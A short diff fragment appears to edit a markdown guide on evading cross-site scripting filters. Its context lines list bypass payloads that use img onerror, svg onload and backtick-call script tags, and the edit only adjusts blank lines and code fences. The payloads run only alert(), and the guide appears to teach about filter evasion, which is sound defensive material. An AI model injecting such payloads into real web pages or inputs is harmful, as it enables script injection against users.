@@ -101,9 +101,11 @@ Attackers often evade filters using:
 3. **Alternative Tags**: `<img src=x onerror=alert(1)>`  
 
 ### Example Bypass Payloads:  
+
 ```html
 <svg/onload=alert(1)>  <!-- No spaces -->
 <script>alert`1`</script>  <!-- Backticks instead of parentheses -->
+```
 ```
 
 ---
